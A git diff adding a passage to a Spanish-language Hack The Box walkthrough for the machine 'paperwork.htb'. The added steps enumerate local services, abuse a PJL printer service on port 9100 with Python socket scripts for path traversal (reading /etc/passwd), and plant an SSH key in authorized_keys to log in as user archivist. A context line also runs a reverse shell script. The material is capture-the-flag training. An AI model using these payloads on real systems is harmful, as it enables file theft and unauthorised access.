@@ -232,3 +232,264 @@ Y ejecutamos el script para obtener una reverse shell
 ```python
 python3 rev.py 10.10.16.99 1111
 ```
+
+```bash
+ss -tlp
+```
+
+```plaintext
+State           Recv-Q           Send-Q                     Local Address:Port                       Peer Address:Port          Process                                    
+LISTEN          0                100                            127.0.0.1:9100                            0.0.0.0:*                                                        
+LISTEN          0                4096                       127.0.0.53%lo:domain                          0.0.0.0:*                                                        
+LISTEN          0                100                              0.0.0.0:1515                            0.0.0.0:*              users:(("python3",pid=986,fd=3))          
+LISTEN          0                4096                          127.0.0.54:domain                          0.0.0.0:*                                                        
+LISTEN          0                128                            127.0.0.1:1337                            0.0.0.0:*                                                        
+LISTEN          0                511                              0.0.0.0:http                            0.0.0.0:*                                                        
+LISTEN          0                4096                             0.0.0.0:ssh                             0.0.0.0:*                                                        
+LISTEN          0                4096                                [::]:ssh                                [::]:*
+```
+
+```bash
+systemctl list-units --type=service
+```
+
+```plaintext
+  UNIT                                     LOAD   ACTIVE SUB     DESCRIPTION                                                                  
+  apparmor.service                         loaded active exited  Load AppArmor profiles
+  auditd.service                           loaded active running Security Audit Logging Service
+  blk-availability.service                 loaded active exited  Availability of block devices
+  chrony.service                           loaded active running chrony, an NTP client/server
+  console-setup.service                    loaded active exited  Set console font and keymap
+  corposite.service                        loaded active running CorpoSite Service
+  cron.service                             loaded active running Regular background program processing daemon
+  dbus.service                             loaded active running D-Bus System Message Bus
+  dracut-shutdown.service                  loaded active exited  Restore /run/initramfs on shutdown
+  finalrd.service                          loaded active exited  Create final runtime dir for shutdown pivot root
+  getty@tty1.service                       loaded active running Getty on tty1
+  ifup@eth0.service                        loaded active exited  ifup for eth0
+  ifupdown-pre.service                     loaded active exited  Helper to synchronize boot up for ifupdown
+  jetdirect.service                        loaded active running jetdirect server
+  keyboard-setup.service                   loaded active exited  Set the console keyboard layout
+  kmod-static-nodes.service                loaded active exited  Create List of Static Device Nodes
+  lpdserver.service                        loaded active running LPD server
+  lvm2-monitor.service                     loaded active exited  Monitoring of LVM2 mirrors, snapshots etc. using dmeventd or progress polling
+  networkd-dispatcher.service              loaded active running Dispatcher daemon for systemd-networkd
+  networking.service                       loaded active exited  Raise network interfaces
+  nginx.service                            loaded active running A high performance web server and a reverse proxy server
+  open-vm-tools.service                    loaded active running Service for virtual machines hosted on VMware
+  paperwork.service                        loaded active running Paperwork Management Daemon
+  plymouth-quit-wait.service               loaded active exited  Hold until boot process finishes up
+  plymouth-quit.service                    loaded active exited  Terminate Plymouth Boot Screen
+  plymouth-read-write.service              loaded active exited  Tell Plymouth To Write Out Runtime Data
+  setvtrgb.service                         loaded active exited  Set console scheme
+  sysstat.service                          loaded active exited  Resets System Activity Logs
+  systemd-binfmt.service                   loaded active exited  Set Up Additional Binary Formats
+  systemd-fsck-root.service                loaded active exited  File System Check on Root Device
+  systemd-fsck@dev-sda2.service            loaded active exited  File System Check on /dev/sda2
+  systemd-journal-flush.service            loaded active exited  Flush Journal to Persistent Storage
+  systemd-journald.service                 loaded active running Journal Service
+  systemd-logind.service                   loaded active running User Login Management
+  systemd-modules-load.service             loaded active exited  Load Kernel Modules
+  systemd-random-seed.service              loaded active exited  Load/Save OS Random Seed
+```
+
+```bash
+systemctl cat jetdirect
+```
+
+```plaintext
+# /etc/systemd/system/jetdirect.service
+[Unit]
+Description=jetdirect server
+After=jetdirect.service
+Requires=jetdirect.service
+
+[Service]
+Type=simple
+User=archivist
+WorkingDirectory=/home/archivist/printer/
+ExecStart=/usr/bin/python3 /home/archivist/printer/jetdirect.py 9100 /home/archivist/printer/ /home/archivist/printer/logs/commands.log
+Restart=on-failure
+
+[Install]
+WantedBy=multi-user.target
+```
+
+Dado el puerto y el servicio buscamos información sobre el puerto, servicio y protocolo.
+
+[9100/tcp - PJL (Printer Job Language)](https://hacktricks.wiki/en/network-services-pentesting/9100-pjl.html)
+
+[Printer Job Language Technical Reference Manual](https://h10032.www1.hp.com/ctg/Manual/bpl13208.pdf)
+
+Hay un comando que nos permite subir un archivo pasandole una ruta del mismo (`FSUPLOAD Command`) encontramos como ejecutarlo dentro de la documentación del lenguaje PJL, aprovechando este comando se puede probar un path traversal. Dentro del directorio `/tmp` creamos un archivo `lat.py` y probamos obtener el archivo `/etc/passwd`.
+
+```python3
+import socket
+
+s = socket.socket()
+s.connect(("127.0.0.1",9100))
+
+s.sendall(b"@PJL FSUPLOAD NAME=\"../../../../etc/passwd\"\r\n")
+
+print(s.recv(4096).decode())
+
+s.close()
+```
+
+```bash
+python3 lat.py
+```
+
+```plaintext
+@PJL FSUPLOAD NAME="0:../../../../etc/passwd" SIZE=1672
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+messagebus:x:997:997:System Message Bus:/nonexistent:/usr/sbin/nologin
+systemd-resolve:x:991:991:systemd Resolver:/:/usr/sbin/nologin
+_chrony:x:101:103:Chrony daemon:/var/lib/chrony:/usr/sbin/nologin
+usbmux:x:102:46:usbmux daemon:/var/lib/usbmux:/usr/sbin/nologin
+polkitd:x:990:990:User for polkitd:/:/usr/sbin/nologin
+syslog:x:104:104::/nonexistent:/usr/sbin/nologin
+uuidd:x:105:105::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:106:107::/nonexistent:/usr/sbin/nologin
+tss:x:107:108:TPM software stack:/var/lib/tpm:/bin/false
+fwupd-refresh:x:988:988:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
+sshd:x:987:65534:sshd user:/run/sshd:/usr/sbin/nologin
+archivist:x:1000:1000:archivist:/home/archivist:/bin/bash
+_laurel:x:999:987::/var/log/laurel:/bin/false
+```
+
+Una vez comprobado el path traversal podemos probar obtener la clave ssh del usuario `archivist`.
+
+```bash
+import socket
+
+s = socket.socket()
+s.connect(("127.0.0.1",9100))
+
+s.sendall(b"@PJL FSUPLOAD NAME=\"../../../../home/archivist/.ssh/authorized_keys\"\r\n")
+
+print(s.recv(4096).decode())
+
+s.close()
+```
+
+```plaintext
+@PJL FSUPLOAD NAME="../../../../home/archivist/.ssh/authorized_keys" SIZE=0
+```
+
+El archivo existe pero está vacío. Creamos un par de claves SSH.
+
+```bash
+ssh-keygen -t ed25519 -f archivist -N ""
+```
+
+```plaintext
+Generating public/private ed25519 key pair.
+Your identification has been saved in archivist
+Your public key has been saved in archivist.pub
+The key fingerprint is:
+SHA256:zK/1XWJkQIy4py27DqorspO99s6tVs8vZIPPRrbz62A melvin@archlinux
+The key's randomart image is:
++--[ED25519 256]--+
+|         . o.    |
+|        . ...    |
+|         .  .    |
+|       o. .  .   |
+|       .S+    o  |
+|      o O..  o   |
+| o   ..XE=o   o .|
+|= o..o o@+ . o o |
+|o=+B*..o+B=.. .  |
++----[SHA256]-----+
+```
+
+Copiamos la clave pública y la pegamos dentro del script para añadirla al archivo `authorized_keys` del usuario `archivist`.
+
+```bash
+cat archivist.pub 
+```
+
+```plaintext
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAID5mZaV6sPb0FWOEUbm0wGKVFxdO6b1XEgCDXH9s0qPi melvin@archlinux
+```
+
+```bash
+import socket
+
+s = socket.socket()
+s.connect(("127.0.0.1",9100))
+
+key = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAID5mZaV6sPb0FWOEUbm0wGKVFxdO6b1XEgCDXH9s0qPi melvin@archlinux\n"
+
+payload = f'@PJL FSDOWNLOAD NAME="../../../../home/archivist/.ssh/authorized_keys" SIZE={len(key)}\r\n{key}'
+s.sendall(payload.encode())
+
+print(s.recv(4096).decode())
+
+s.close()
+```
+
+Ejecutamos el script y nos conectamos por SSH desde la máquina atacante.
+
+```bash
+python3 lat.py 
+```
+
+```plaintext
+OK
+```
+
+```bash
+ssh -i archivist archivist@paperwork.htb
+```
+
+Obtenemos la flag de user
+
+```bash
+ls -la 
+```
+
+```plaintext
+total 48
+drwxr-x--- 7 archivist archivist 4096 May 28 15:45 .
+drwxr-xr-x 3 root      root      4096 May 28 15:45 ..
+lrwxrwxrwx 1 root      root         9 May 26 16:08 .bash_history -> /dev/null
+-rw-r--r-- 1 archivist archivist  220 Sep  8  2025 .bash_logout
+-rw-r--r-- 1 archivist archivist 3771 Sep  8  2025 .bashrc
+drwx------ 2 archivist archivist 4096 May 28 15:45 .cache
+drwx------ 3 archivist archivist 4096 May 28 15:45 .gnupg
+-rw------- 1 archivist archivist   20 Mar 11 13:12 .lesshst
+drwxrwxr-x 3 archivist archivist 4096 May 28 15:45 .local
+-rw-r--r-- 1 archivist archivist  807 Sep  8  2025 .profile
+drwx------ 2 archivist archivist 4096 May 28 15:45 .ssh
+drwxrwxr-x 3 archivist archivist 4096 May 28 15:45 printer
+-rw-r----- 1 root      archivist   33 Jul 14 14:25 user.txt
+```
+
+```bash
+cat user.txt 
+```
+
+### User flag
+
+<Callout type="success" title="User flag">
+c******************************4
+</Callout>
